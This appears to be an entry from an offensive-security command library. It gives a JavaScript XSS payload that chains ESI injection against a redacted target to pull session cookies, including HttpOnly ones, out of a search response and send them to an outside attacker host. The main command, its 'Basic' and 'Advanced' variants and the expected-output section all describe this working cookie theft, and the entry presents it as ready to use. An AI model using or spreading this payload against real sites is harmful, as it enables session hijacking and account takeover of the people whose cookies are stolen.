---
id: cmd-fetch-esi-exfil
data: >-
  fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function(response){return
  response.text();}).then(function(html){var parser = new DOMParser();var doc =
  parser.parseFromString(html,'text/html');var cookies =
  doc.getElementById("x61_ms").value;fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);}).catch(function(err){console.warn('Something
  went wrong.', err);});
tags:
  - xss
  - exfiltration
  - javascript
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.371Z'
verified: false
validated: true
submitted: true
---
# Fetch ESI URL and Exfiltrate Cookies via XSS

## Command

```javascript
fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function(response){return response.text();}).then(function(html){var parser = new DOMParser();var doc = parser.parseFromString(html,'text/html');var cookies = doc.getElementById("x61_ms").value;fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);}).catch(function(err){console.warn('Something went wrong.', err);});
```

## Description

This JavaScript command, executed in a browser via XSS, fetches the ESI-injected search endpoint to retrieve leaked cookies, parses the HTML response using DOMParser to extract the cookie value from the input element with id 'x61_ms', and exfiltrates it via a GET request to an attacker server. Use in chaining scenarios to steal HttpOnly session cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The ESI injection endpoint URL (hardcoded in fetch) | Yes |
| `element_id` | ID of the input field containing cookies ('x61_ms') | Yes |
| `attacker_url` | Exfiltration endpoint (e.g., https://www.jr0ch17.com/ato?cookies=${cookies}) | Yes |

## Examples

### Basic Usage

```javascript
fetch('https://target.com/esi-endpoint?ms=<payload>').then(r => r.text()).then(html => { var doc = new DOMParser().parseFromString(html, 'text/html'); var cookies = doc.getElementById('x61_ms').value; fetch(`https://attacker.com/ato?cookies=${cookies}`); });
```

### Advanced Usage

Add error handling and URL encoding for cookies:

```javascript
fetch(esiUrl).then(r => r.text()).then(html => { var doc = new DOMParser().parseFromString(html, 'text/html'); var cookies = encodeURIComponent(doc.getElementById('x61_ms').value); fetch(`https://attacker.com/ato?cookies=${cookies}`); }).catch(e => console.error(e));
```

## Expected Output

No console output on success; instead, a network request to the attacker URL with query parameter 'cookies' containing the full session string (e.g., 'JSESSIONID=abc123; other=val'). On error, console warns 'Something went wrong.' Check browser network tab for requests.

## Related

- [[Related Procedure|procedures/Chain-ESI-Injection-with-XSS-to-Steal-Session-Cookies]]
